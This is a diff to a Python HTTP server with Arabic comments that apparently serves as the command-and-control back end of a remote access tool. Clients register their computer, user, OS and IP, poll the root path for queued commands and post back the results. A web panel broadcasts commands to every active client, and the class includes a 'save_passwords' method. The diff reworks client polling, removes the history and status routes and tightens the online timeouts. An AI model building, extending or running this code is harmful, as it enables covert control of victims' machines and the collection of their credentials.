@@ -254,13 +254,31 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         if not self.check_security():
             return
-
+    
         try:
             path = urllib.parse.urlparse(self.path).path
             session_id = self.get_session_id()
             
             if path == '/':
-                self.send_login_page()
+                query = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
+                client_id = query.get('client_id', [None])[0]
+                
+                if client_id:
+                    # معالجة طلبات العميل
+                    if client_id in self.sessions:
+                        self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
+                        pending_command = self.sessions[client_id]['pending_command']
+                        
+                        if pending_command:
+                            self.sessions[client_id]['pending_command'] = None
+                            self.send_json({'command': pending_command})
+                        else:
+                            self.send_json({'status': 'no_commands'})
+                    else:
+                        self.send_json({'error': 'Client not found'})
+                else:
+                    # عرض صفحة الدخول
+                    self.send_login_page()
             
             elif path == '/admin-auth':
                 if self.validate_session(session_id) and self.get_session_level(session_id, 'level1'):
@@ -280,28 +298,10 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 else:
                     self.send_error(403, "Access Denied")
             
-            # ⚡ إضافة المسارات الجديدة للاوامر والنتائج
-            elif path == '/commands':
-                if self.validate_session(session_id) and self.get_session_level(session_id, 'level1') and self.get_session_level(session_id, 'level2'):
-                    self.handle_get_commands()
-                else:
-                    self.send_error(403, "Access Denied")
-            
+            # ✅ **إضافة مسار /result المفقود**
             elif path == '/result':
                 if self.validate_session(session_id) and self.get_session_level(session_id, 'level1') and self.get_session_level(session_id, 'level2'):
                     self.handle_get_result()
-                else:
-                    self.send_error(403, "Access Denied")
-            
-            elif path == '/history':
-                if self.validate_session(session_id) and self.get_session_level(session_id, 'level1') and self.get_session_level(session_id, 'level2'):
-                    self.send_command_history()
-                else:
-                    self.send_error(403, "Access Denied")
-            
-            elif path == '/status':
-                if self.validate_session(session_id) and self.get_session_level(session_id, 'level1') and self.get_session_level(session_id, 'level2'):
-                    self.send_system_status()
                 else:
                     self.send_error(403, "Access Denied")
             
@@ -325,6 +325,11 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             post_data = self.rfile.read(content_length).decode('utf-8')
             data = json.loads(post_data) if post_data else {}
             
+            # ⚡ **التعديل الجديد: معالجة الطلبات على المسار الرئيسي /**
+            if self.path == '/':
+                self.handle_main_endpoint(data)
+                return
+                
             routes = {
                 '/login': self.handle_login,
                 '/admin-login': self.handle_admin_login,
@@ -340,27 +345,67 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 
         except Exception as e:
             self.send_json({'error': str(e)})
-
-    # ⚡ الدوال التي ترسل وتستقبل الأوامر والنتائج - تم إضافتها كما هي
-
-    def handle_get_commands(self):
-        """استقبال الأوامر الجاهزة من العميل"""
-        with self.session_lock:
-            parsed = urllib.parse.urlparse(self.path)
-            query = urllib.parse.parse_qs(parsed.query)
-            client_id = query.get('client', [None])[0]
+    
+    def handle_main_endpoint(self, data):
+        """معالجة الطلبات على المسار الرئيسي /"""
+        action = data.get('action', '')
+        
+        if action == 'register' or 'client_id' in data:
+            # تسجيل العميل
+            self.handle_client_register(data)
             
+        elif action == 'check_commands' or 'check_commands' in data:
+            # التحقق من الأوامر
+            client_id = data.get('client_id')
             if client_id and client_id in self.sessions:
                 self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
+                self.sessions[client_id]['status'] = 'online'  # ✅ تحديث الحالة
                 pending_command = self.sessions[client_id]['pending_command']
                 
                 if pending_command:
                     self.sessions[client_id]['pending_command'] = None
-                    self.send_json({'command': pending_command, 'instant': True})
+                    self.send_json({
+                        'command': pending_command,
+                        'action': 'command_received'
+                    })
                 else:
-                    self.send_json({'waiting': False, 'instant': True})
+                    self.send_json({
+                        'status': 'waiting', 
+                        'action': 'no_commands'
+                    })
             else:
-                self.send_json({'error': 'Client not found', 'instant': True})
+                self.send_json({'error': 'Client not found'})
+                
+        elif action == 'send_response' or 'response' in data:
+            # إرسال نتيجة الأمر
+            client_id = data.get('client_id')
+            if client_id and client_id in self.sessions:
+                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
+                self.sessions[client_id]['status'] = 'online'  # ✅ تحديث الحالة
+            self.handle_client_response(data)
+            
+        elif action == 'heartbeat' or 'heartbeat' in data:
+            # نبضات القلب
+            client_id = data.get('client_id')
+            if client_id and client_id in self.sessions:
+                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
+                self.sessions[client_id]['status'] = 'online'  # ✅ تحديث الحالة
+                self.send_json({'status': 'alive', 'action': 'heartbeat_ack'})
+            else:
+                # إذا لم يكن مسجلاً، سجله
+                self.handle_client_register(data)
+                
+        else:
+            # طلب غير معروف - حاول تسجيله كعميل
+            if 'client_id' in data:
+                self.handle_client_register(data)
+            else:
+                self.send_json({'error': 'Unknown action', 'available_actions': [
+                    'register', 'check_commands', 'send_response', 'heartbeat'
+                ]})
+
+    # ⚡ الدوال التي ترسل وتستقبل الأوامر والنتائج - تم إضافتها كما هي
+
 
     def handle_execute_command(self, data):
         """إرسال أمر جديد إلى العميل"""
@@ -382,21 +427,6 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             else:
                 self.send_json({'success': False, 'error': 'Client not found'})
 
-    def handle_get_result(self):
-        """الحصول على النتائج من العميل"""
-        with self.session_lock:
-            parsed = urllib.parse.urlparse(self.path)
-            query = urllib.parse.parse_qs(parsed.query)
-            
-            client_id = query.get('client', [''])[0]
-            command = query.get('command', [''])[0]
-            
-            if client_id in self.sessions and self.sessions[client_id]['last_response']:
-                result = self.sessions[client_id]['last_response']
-                self.sessions[client_id]['last_response'] = None
-                self.send_json({'result': result, 'instant': True})
-            else:
-                self.send_json({'pending': True, 'instant': True})
 
     def handle_client_response(self, data):
         """استقبال نتيجة الأمر من العميل"""
@@ -459,7 +489,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 if incoming_os != 'Unknown':
                     self.sessions[existing_client]['os'] = incoming_os
 
-                print(f"✅ INSTANT Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
+                print(f" INSTANT Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
                 self.send_json({'success': True, 'client_id': existing_client, 'instant': True})
             else:
                 self.sessions[client_id] = {
@@ -475,7 +505,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     'last_response': None,
                     'status': 'online'
                 }
-                print(f"🆕 INSTANT New: {incoming_computer} ({incoming_user}) - {client_ip}")
+                print(f" INSTANT New: {incoming_computer} ({incoming_user}) - {client_ip}")
                 self.send_json({'success': True, 'client_id': client_id, 'instant': True})
                 
     def send_sessions_list(self):
@@ -488,61 +518,19 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 last_seen = datetime.fromisoformat(client_data['last_seen'])
                 time_diff = (current_time - last_seen).total_seconds()
             
-                if time_diff < 300:  # 5 دقائق
-                    client_data['is_online'] = time_diff < 5  # ⚡ 5 ثواني للنشط
+                if time_diff < 60:  # ⚡ 60 ثانية (1 دقيقة) للبقاء في القائمة
+                    # ⚡ 30 ثانية للنشط
+                    client_data['is_online'] = time_diff < 30
                     client_data['last_seen_seconds'] = time_diff
                     active_clients.append(client_data)
                 else:
+                    # إزالة العميل إذا انقطع لأكثر من دقيقة
                     del self.sessions[client_id]
-                    print(f"INSTANT Removed inactive: {client_id}")
+                    print(f"🔄 Removed inactive client: {client_id} (offline for {time_diff:.0f}s)")
         
             self.send_json(active_clients)
 
-    def send_command_history(self):
-        """إرسال سجل الأوامر"""
-        try:
-            if hasattr(self, 'cursor'):
-                self.cursor.execute('''
-                    SELECT client_id, command, response, timestamp 
-                    FROM commands 
-                    ORDER BY timestamp DESC 
-                    LIMIT 50
-                ''')
-                history = self.cursor.fetchall()
-                
-                result = []
-                for row in history:
-                    result.append({
-                        'client_id': row[0],
-                        'command': row[1],
-                        'response': row[2],
-                        'timestamp': row[3]
-                    })
-                
-                self.send_json(result)
-            else:
-                self.send_json([])
-        except:
-            self.send_json([])
 
-    def send_system_status(self):
-        """إرسال حالة النظام"""
-        with self.session_lock:
-            status = {
-                'uptime': 'Running - SECURE MODE',
-                'connected_clients': len([c for c in self.sessions.values() 
-                                        if (datetime.now() - datetime.fromisoformat(c['last_seen'])).total_seconds() < 300]),
-                'total_commands': 0,
-                'server_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-                'mode': 'SECURE',
-                'response_time': '0ms'
-            }
-            
-            if hasattr(self, 'cursor'):
-                self.cursor.execute('SELECT COUNT(*) FROM commands')
-                status['total_commands'] = self.cursor.fetchone()[0]
-            
-            self.send_json(status)
 
     def save_passwords(self, passwords):
         """حفظ كلمات المرور"""
@@ -1288,9 +1276,11 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                             const now = Date.now();
                             const timeDiff = (now - lastSeen) / 1000;
                             
-                            let isOnline = timeDiff < 120;
+                            // ⚡ 30 ثانية للنشط
+                            let isOnline = timeDiff < 30;
                             let statusClass = isOnline ? 'online-status' : 'online-status offline';
                             let statusColor = isOnline ? '#28a745' : '#dc3545';
+                            let statusText = isOnline ? '🟢 ONLINE' : '🔴 OFFLINE';
                             
                             const isSelected = client.id === currentClientId;
                             
@@ -1308,6 +1298,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                                     <small>OS: ${client.os || 'Unknown'}</small><br>
                                     <small>IP: ${client.ip}</small><br>
                                     <small>Last: ${timeDisplay}</small>
+                                    <small style="color: ${statusColor}; font-weight: bold;">${statusText}</small>
                                 </div>
                             `;
                         }).join('');
@@ -1333,15 +1324,18 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                         
                         list.innerHTML = sessions.map(client => {
                             const lastSeen = new Date(client.last_seen);
-                            const isOnline = (Date.now() - lastSeen.getTime()) < 120000;
+                            const timeDiff = (Date.now() - lastSeen.getTime()) / 1000;
+                            const isOnline = timeDiff < 30; // ⚡ 30 ثانية
+                            const statusColor = isOnline ? '#28a745' : '#dc3545';
+                            const statusText = isOnline ? '🟢 ONLINE' : '🔴 OFFLINE';
                             
                             return `
                                 <div class="session-item" style="margin: 10px 0;">
                                     <strong>${client.computer || client.id}</strong><br>
                                     <small>User: ${client.user || 'Unknown'} | OS: ${client.os || 'Unknown'}</small><br>
                                     <small>IP: ${client.ip} | Last Seen: ${lastSeen.toLocaleString()}</small><br>
-                                    <small style="color: ${isOnline ? '#28a745' : '#dc3545'}">
-                                        ${isOnline ? ' ONLINE' : ' OFFLINE'}
+                                    <small style="color: ${statusColor}; font-weight: bold;">
+                                        ${statusText} (${Math.floor(timeDiff)}s ago)
                                     </small>
                                     <button onclick="selectClient('${client.id}'); switchTab('control');" style="margin-top: 5px;">Select</button>
                                 </div>
@@ -1354,7 +1348,10 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 
                 function updateSessionStats(sessions) {
                     const total = sessions.length;
-                    const active = sessions.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 120000).length;
+                    const active = sessions.filter(c => {
+                        const timeDiff = (Date.now() - new Date(c.last_seen).getTime()) / 1000;
+                        return timeDiff < 30; // ⚡ 30 ثانية للنشط
+                    }).length;
                     
                     document.getElementById('totalClients').textContent = total;
                     document.getElementById('activeClients').textContent = active;
@@ -1407,13 +1404,17 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                         return;
                     }
                     
-                    const activeClients = allClients.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 300000);
+                    const activeClients = allClients.filter(c => {
+                        const timeDiff = (Date.now() - new Date(c.last_seen).getTime()) / 1000;
+                        return timeDiff < 30; // ⚡ 30 ثانية للنشط
+                    });
+                    
                     if (activeClients.length === 0) {
                         alert('No active clients!');
                         return;
                     }
                     
-                    addToTerminal(`Executing command on ${activeClients.length} clients: ${command}\\n`);
+                    addToTerminal(`Executing command on ${activeClients.length} active clients: ${command}\n`);
                     
                     activeClients.forEach(client => {
                         executeSingleCommand(client.id, command);
@@ -1674,7 +1675,22 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         self.send_response(302)
         self.send_header('Location', location)
         self.end_headers()
-        
+
+    def handle_get_result(self):
+        """الحصول على النتائج من العميل - للتوافق مع JavaScript"""
+        with self.session_lock:
+            parsed = urllib.parse.urlparse(self.path)
+            query = urllib.parse.parse_qs(parsed.query)
+            
+            client_id = query.get('client', [''])[0]
+            
+            if client_id in self.sessions and self.sessions[client_id]['last_response']:
+                result = self.sessions[client_id]['last_response']
+                self.sessions[client_id]['last_response'] = None
+                self.send_json({'result': result})
+            else:
+                self.send_json({'pending': True})
+                
     def handle_logout(self, data):
         """تسجيل الخروج الآمن"""
         session_id = data.get('session_id')
@@ -1693,11 +1709,12 @@ def cleanup_sessions():
             with EnhancedRemoteControlHandler.session_lock:
                 for client_id, client_data in list(EnhancedRemoteControlHandler.sessions.items()):
                     last_seen = datetime.fromisoformat(client_data['last_seen'])
-                    if (current_time - last_seen).total_seconds() > 300:
+                    if (current_time - last_seen).total_seconds() > 60:  # ⚡ 60 ثانية
                         del EnhancedRemoteControlHandler.sessions[client_id]
-            time.sleep(30)
-        except:
-            pass
+                        print(f"🧹 Cleanup removed: {client_id}")
+            time.sleep(30)  # تشغيل كل 30 ثانية
+        except Exception as e:
+            print(f"Cleanup error: {e}")
 
 def main():
     handler = EnhancedRemoteControlHandler
